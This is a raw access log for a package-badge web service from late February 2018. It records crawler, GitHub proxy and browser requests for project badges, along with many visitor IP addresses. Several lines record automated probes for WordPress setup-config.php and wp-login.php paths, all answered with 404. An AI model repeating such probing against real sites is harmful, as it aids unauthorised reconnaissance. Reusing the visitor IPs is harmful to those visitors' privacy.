52.91.151.105 - - [22/Feb/2018:15:40:18 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.151.105 - - [22/Feb/2018:15:40:48 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.36 - - [22/Feb/2018:16:05:55 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
72.204.67.223 - - [22/Feb/2018:18:10:46 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
73.170.233.167 - - [22/Feb/2018:18:24:02 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
52.91.151.105 - - [22/Feb/2018:18:40:22 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
52.91.151.105 - - [22/Feb/2018:18:40:54 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.36 - - [22/Feb/2018:19:18:38 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
144.76.23.82 - - [22/Feb/2018:19:33:00 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.0; trendictionbot0.5.0; trendiction search; http://www.trendiction.de/bot; please let us know of any problems; web at trendiction.com) Gecko/20071127 Firefox/3.0.0.11"
144.76.23.82 - - [22/Feb/2018:19:33:10 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.0; trendictionbot0.5.0; trendiction search; http://www.trendiction.de/bot; please let us know of any problems; web at trendiction.com) Gecko/20071127 Firefox/3.0.0.11"
192.30.252.38 - - [22/Feb/2018:19:35:49 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [22/Feb/2018:19:37:40 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
54.37.85.61 - - [22/Feb/2018:20:20:03 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
54.37.85.61 - - [22/Feb/2018:20:20:10 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
85.193.141.131 - - [22/Feb/2018:21:01:40 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
85.193.141.131 - - [22/Feb/2018:21:03:36 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.36 - - [22/Feb/2018:21:27:30 +0000] "GET /badge/wapmorgan/time-parser HTTP/1.1" 200 1190 "-" "github-camo (65c9ebe0)"
93.143.89.42 - - [22/Feb/2018:21:53:43 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "http://wapmorgan.github.io/UnifiedArchive/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
192.30.252.34 - - [22/Feb/2018:22:17:11 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [22/Feb/2018:23:49:56 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
174.48.222.65 - - [22/Feb/2018:23:51:56 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.35 - - [22/Feb/2018:23:54:27 +0000] "GET /badge/wapmorgan/onecloud-api HTTP/1.1" 200 1193 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [23/Feb/2018:00:06:48 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
192.30.252.47 - - [23/Feb/2018:00:07:09 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [23/Feb/2018:00:09:36 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.36 - - [23/Feb/2018:00:12:30 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [23/Feb/2018:01:55:17 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
86.242.232.6 - - [23/Feb/2018:01:55:25 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
192.187.101.178 - - [23/Feb/2018:02:05:14 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0"
63.141.244.250 - - [23/Feb/2018:02:12:21 +0000] "GET /blogs/wp-admin/setup-config.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
63.141.244.250 - - [23/Feb/2018:02:12:21 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
63.141.244.250 - - [23/Feb/2018:02:12:21 +0000] "GET /beta/wp-admin/setup-config.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
63.141.244.250 - - [23/Feb/2018:02:12:21 +0000] "GET /blog/wordpress/wp-admin/setup-config.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
63.141.244.250 - - [23/Feb/2018:02:12:21 +0000] "GET /site/wp-admin/setup-config.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
63.141.244.250 - - [23/Feb/2018:02:12:21 +0000] "GET /cms/wp-admin/setup-config.php HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
192.30.252.46 - - [23/Feb/2018:02:40:01 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [23/Feb/2018:02:42:44 +0000] "GET /badge/wapmorgan/morphos-blade HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
73.189.117.187 - - [23/Feb/2018:03:56:00 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
123.125.71.97 - - [23/Feb/2018:06:20:24 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "http://image.baidu.com/i?ct=503316480&z=0&tn=baiduimagedetail" "Baiduspider-image+(+http://www.baidu.com/search/spider.htm)"
192.30.252.47 - - [23/Feb/2018:06:25:15 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
185.85.232.10 - - [23/Feb/2018:08:25:03 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
101.95.1.78 - - [23/Feb/2018:08:39:29 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/602.1 (KHTML, like Gecko) JavaFX/8.0 Safari/602.1"
101.95.1.78 - - [23/Feb/2018:08:39:29 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/602.1 (KHTML, like Gecko) JavaFX/8.0 Safari/602.1"
84.204.144.174 - - [23/Feb/2018:08:57:13 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
192.30.252.34 - - [23/Feb/2018:10:02:44 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
109.201.96.106 - - [23/Feb/2018:10:55:20 +0000] "GET /badge/wapmorgan/file-type-detector HTTP/1.1" 200 1215 "http://wapmorgan.github.io/FileTypeDetector/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.46 - - [23/Feb/2018:11:01:09 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
207.46.13.105 - - [23/Feb/2018:11:01:21 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
193.19.228.18 - - [23/Feb/2018:11:08:07 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "http://wapmorgan.github.io/PhpCodeFixer/" "Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
192.30.252.34 - - [23/Feb/2018:11:37:54 +0000] "GET /badge/wapmorgan/yii2-inflection HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.36 - - [23/Feb/2018:13:40:46 +0000] "GET /badge/wapmorgan/ncursesobjects HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
62.23.102.26 - - [23/Feb/2018:13:47:15 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
93.209.90.211 - - [23/Feb/2018:14:51:41 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.38 - - [23/Feb/2018:15:16:53 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
179.7.114.104 - - [23/Feb/2018:15:16:57 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
82.99.223.82 - - [23/Feb/2018:16:16:33 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.46 - - [23/Feb/2018:17:15:59 +0000] "GET /badge/wapmorgan/server-availability-monitor HTTP/1.1" 200 1244 "-" "github-camo (65c9ebe0)"
73.252.232.28 - - [23/Feb/2018:17:19:53 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /style/site.css HTTP/1.1" 200 34938 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /style/1.css HTTP/1.1" 200 30680 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /style/common.css HTTP/1.1" 200 23447 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /style/bootstrap.min.js HTTP/1.1" 200 37107 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /style/bootstrap.min.css HTTP/1.1" 200 122155 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /style/jquery-1.11.3.min.js HTTP/1.1" 200 95957 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /style/main.js HTTP/1.1" 200 4385 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /gallery_gen/6f8f57715090da2632453988d9a1501b_100x100.png HTTP/1.1" 200 2331 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /badge/wapmorgan/php-code-fixer.png HTTP/1.1" 200 1203 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /badge/wapmorgan/php-code-fixer/2.png HTTP/1.1" 200 1209 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /badge/wapmorgan/php-code-fixer/0.png HTTP/1.1" 200 1205 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /badge/vendor/package HTTP/1.1" 200 1173 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /img/flags_matrix.png HTTP/1.1" 200 66420 "http://composer.network/style/site.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:52 +0000] "GET /gallery_gen/5cfdb867e96374c7883b31d6928cc4cb.jpg HTTP/1.1" 200 280468 "http://composer.network/style/1.css" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
213.55.176.202 - - [23/Feb/2018:19:48:53 +0000] "GET /favicon.ico HTTP/1.1" 200 4286 "http://composer.network/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.38 - - [23/Feb/2018:19:54:24 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [23/Feb/2018:20:08:26 +0000] "GET /badge/wapmorgan/time-parser HTTP/1.1" 200 1190 "-" "github-camo (65c9ebe0)"
66.249.69.196 - - [23/Feb/2018:20:57:48 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.223 - - [23/Feb/2018:20:57:48 +0000] "GET / HTTP/1.1" 200 3393 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.196 - - [23/Feb/2018:20:58:05 +0000] "GET /style/site.css HTTP/1.1" 200 34938 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.193 - - [23/Feb/2018:20:58:05 +0000] "GET /style/common.css HTTP/1.1" 200 23447 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.193 - - [23/Feb/2018:20:58:06 +0000] "GET /style/1.css HTTP/1.1" 200 30680 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.69.193 - - [23/Feb/2018:20:58:06 +0000] "GET /style/bootstrap.min.css HTTP/1.1" 200 122155 "http://composer.network/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.3 - - [24/Feb/2018:00:21:18 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.53 - - [24/Feb/2018:00:21:22 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
192.30.252.35 - - [24/Feb/2018:01:54:51 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
195.22.125.11 - - [24/Feb/2018:02:40:34 +0000] "GET /wp-login.php HTTP/1.1" 404 580 "http://composer.network/wp-login.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
195.22.125.11 - - [24/Feb/2018:02:40:34 +0000] "GET /wp-login.php HTTP/1.1" 404 580 "http://composer.network/wp-login.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
119.93.135.66 - - [24/Feb/2018:04:15:04 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
65.55.210.152 - - [24/Feb/2018:06:53:33 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
38.140.244.18 - - [24/Feb/2018:08:44:57 +0000] "GET / HTTP/1.1" 200 9633 "-" "-"
192.30.252.38 - - [24/Feb/2018:09:16:37 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [24/Feb/2018:09:21:14 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
192.30.252.47 - - [24/Feb/2018:09:21:14 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
192.30.252.36 - - [24/Feb/2018:14:34:49 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
157.55.39.11 - - [24/Feb/2018:16:12:03 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
192.30.252.34 - - [24/Feb/2018:19:22:21 +0000] "GET /badge/wapmorgan/onecloud-api HTTP/1.1" 200 1193 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [24/Feb/2018:21:30:37 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
192.30.252.38 - - [24/Feb/2018:22:26:58 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [24/Feb/2018:22:29:17 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
192.30.252.35 - - [24/Feb/2018:22:58:56 +0000] "GET /badge/wapmorgan/server-availability-monitor HTTP/1.1" 200 1244 "-" "github-camo (65c9ebe0)"
192.30.252.36 - - [24/Feb/2018:23:26:08 +0000] "GET /badge/wapmorgan/ncursesobjects HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [25/Feb/2018:06:02:43 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
125.163.109.223 - - [25/Feb/2018:06:16:43 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.46 - - [25/Feb/2018:07:36:51 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
65.49.68.155 - - [25/Feb/2018:12:34:43 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.0" 200 1202 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 OPR/51.0.2830.34"
157.55.39.139 - - [25/Feb/2018:13:11:39 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
192.30.252.46 - - [25/Feb/2018:13:51:44 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [25/Feb/2018:13:52:33 +0000] "GET /badge/wapmorgan/php-code-analyzer HTTP/1.1" 200 1214 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [25/Feb/2018:16:39:17 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
184.157.249.233 - - [25/Feb/2018:17:55:28 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 929) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
192.30.252.46 - - [25/Feb/2018:20:07:53 +0000] "GET /badge/wapmorgan/threadable HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
192.30.252.34 - - [25/Feb/2018:20:08:33 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "github-camo (65c9ebe0)"
147.135.128.113 - - [26/Feb/2018:03:50:15 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
147.135.128.113 - - [26/Feb/2018:03:50:20 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
147.135.128.113 - - [26/Feb/2018:03:52:17 +0000] "GET /badge/wapmorgan/php-code-fixer HTTP/1.1" 200 1203 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
147.135.128.113 - - [26/Feb/2018:04:05:16 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
147.135.128.113 - - [26/Feb/2018:05:34:00 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
147.135.128.113 - - [26/Feb/2018:05:34:07 +0000] "GET /badge/wapmorgan/php-rpm-packager HTTP/1.1" 200 1209 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
147.135.128.113 - - [26/Feb/2018:05:40:08 +0000] "GET /badge/wapmorgan/morphos HTTP/1.1" 200 1184 "-" "Barkrowler/0.7 (+http://www.exensa.com/crawl)"
192.30.252.34 - - [26/Feb/2018:08:28:03 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "github-camo (65c9ebe0)"
103.255.7.4 - - [26/Feb/2018:09:54:39 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
192.30.252.36 - - [26/Feb/2018:10:00:29 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "github-camo (65c9ebe0)"
103.255.7.4 - - [26/Feb/2018:10:00:32 +0000] "GET /badge/wapmorgan/media-file HTTP/1.1" 200 1189 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
85.249.6.18 - - [26/Feb/2018:10:06:21 +0000] "GET /badge/wapmorgan/mp3info HTTP/1.1" 200 1184 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
192.30.252.47 - - [26/Feb/2018:10:14:16 +0000] "GET /badge/wapmorgan/ncursesobjects HTTP/1.1" 200 1203 "-" "github-camo (65c9ebe0)"
115.78.4.37 - - [26/Feb/2018:10:22:20 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36"
35.168.2.89 - - [26/Feb/2018:10:33:23 +0000] "GET /robots.txt HTTP/1.1" 404 152 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.47 - - [26/Feb/2018:10:35:01 +0000] "GET /badge/wapmorgan/onecloud-api HTTP/1.1" 200 1193 "-" "github-camo (65c9ebe0)"
35.168.2.89 - - [26/Feb/2018:11:10:06 +0000] "GET /badge/wapmorgan/unified-playlist HTTP/1.1" 200 1209 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
192.30.252.34 - - [26/Feb/2018:12:03:19 +0000] "GET /badge/wapmorgan/morphos-blade HTTP/1.1" 200 1202 "-" "github-camo (65c9ebe0)"
192.30.252.46 - - [26/Feb/2018:12:04:02 +0000] "GET /badge/wapmorgan/morphos-twig HTTP/1.1" 200 1193 "-" "github-camo (65c9ebe0)"
103.207.168.162 - - [26/Feb/2018:12:55:41 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
192.30.252.47 - - [26/Feb/2018:13:37:29 +0000] "GET /badge/wapmorgan/unified-archive HTTP/1.1" 200 1208 "-" "github-camo (65c9ebe0)"
35.168.2.89 - - [26/Feb/2018:13:49:08 +0000] "GET /badge/wapmorgan/binary-stream HTTP/1.1" 200 1202 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
